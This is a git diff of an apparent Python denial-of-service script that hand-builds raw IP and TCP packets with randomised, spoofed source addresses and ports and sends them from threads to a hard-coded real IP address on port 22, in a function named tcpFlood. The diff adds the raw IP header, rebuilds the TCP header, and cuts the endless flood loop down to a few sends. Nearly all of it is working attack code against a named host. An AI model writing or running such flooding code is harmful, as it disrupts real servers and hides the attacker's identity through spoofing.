@@ -34,6 +34,20 @@ class TCPPacket:
         self.flags = flags
 
     def build(self) -> bytes:
+        ihl = 5
+        version = 4
+        tos = 0
+        tot_len = 20 + 20
+        id = random.randint(1,65535)
+        frag_off = 0
+        ttl = random.randint(1,255)
+        protocol = socket.IPPROTO_TCP
+        check = 10 
+        saddr =socket.inet_aton ( self.src_host )
+        daddr = socket.inet_aton ( self.dst_host )
+        ihl_version = (version << 4) + ihl
+        ip_header = struct.pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
+        
         packet = struct.pack(
             '!HHIIBBHHH',
             self.src_port,  # Source Port
@@ -55,30 +69,45 @@ class TCPPacket:
             len(packet)                         # TCP Length
         )
 
-        checksum = chksum(pseudo_hdr + packet)
+        psh = pseudo_hdr + packet
+        tcp_checksum = chksum(psh)
+        tcp_header = struct.pack(
+            '!HHLLBBHHH',
+            self.src_port,  # Source Port
+            self.dst_port,  # Destination Port
+            0,              # Sequence Number
+            0,              # Acknoledgement Number
+            5 << 4,         # Data Offset
+            self.flags,     # Flags
+            8192,           # Window
+            tcp_checksum,              # Checksum (initial value)
+            0               # Urgent pointer
+        )
+        return ip_header + tcp_header
 
-        packet = packet[:16] + struct.pack('H', checksum) + packet[18:]
+        # checksum = chksum(pseudo_hdr + packet)
 
-        return packet
+        # packet = packet[:16] + struct.pack('H', checksum) + packet[18:]
+
+        # return packet
 
 def tcpFlood():
     dst = '185.43.206.93'
 
-    while True:
-        pak = TCPPacket(
-            randomIP(),
-            randomPort(),
-            dst,
-            22,
-            0b000101001
-        )
-        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-        for i in range(3):
-            s.sendto(pak.build(), (dst, 0))
+    pak = TCPPacket(
+        randomIP(),
+        randomPort(),
+        dst,
+        22,
+        0b000101001
+    )
+    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+    for i in range(3):
+        s.sendto(pak.build(), (dst, 0))
+
 
 if __name__ == '__main__':
-    for i in range(2):
+    for i in range(1):
         print("Thread ", i, "Started")
         t = threading.Thread(target=tcpFlood)
         t.start()
-    
